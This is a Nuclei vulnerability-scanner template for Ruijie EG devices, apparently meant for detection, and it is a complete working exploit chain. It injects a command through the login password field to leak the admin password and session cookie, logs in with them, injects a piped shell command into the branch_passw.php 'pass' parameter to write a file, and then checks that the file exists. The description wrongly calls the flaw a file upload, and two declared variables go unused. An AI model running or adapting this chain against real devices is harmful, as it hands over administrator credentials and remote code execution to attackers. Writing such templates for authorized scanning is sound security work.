id: ruijie-eg-login-password-getshell
info:
  name: Ruijie EG Login Password Command Execution Getshell
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The Ruijie EG device has a file upload vulnerability. An attacker can exploit this issue to upload a file and achieve remote code execution on the device.
  reference:
    - https://fofa.so/

variables:
  random_pass: '{{rand_text_alphanumeric(8)}}'
  random_file: '{{rand_text_alphanumeric(8)}}'

flow: |
  http(1) && http(2) && http(3) && http(4)

http:
  - id: login-request
    raw:
      - |
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        username=admin&password=admin?show+webmaster+user
    extractors:
      - type: regex
        name: pass
        internal: true
        part: body
        regex:
          - "admin (.*?)(\\r|\")"
      - type: regex
        name: cook1
        internal: true
        part: header
        regex:
          - "(RUIJIEID=.*;)"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "admin"

  - id: login-second-step
    raw:
      - |
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        username=admin&password={{pass}}
    matchers:
      - type: status
        status:
          - 200

  - id: upload-shell
    raw:
      - |
        POST /itbox_pi/branch_passw.php?a=set HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{cook1}}
        X-Requested-With: XMLHttpRequest

        pass=|echo 'vbdlxnlgsn153439'>ruijieruijieruijie.txt
    matchers:
      - type: status
        status:
          - 200

  - id: verify-shell
    raw:
      - |
        GET /itbox_pi/ruijieruijieruijie.txt HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{cook1}}
        X-Requested-With: XMLHttpRequest
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "vbdlxnlgsn153439"
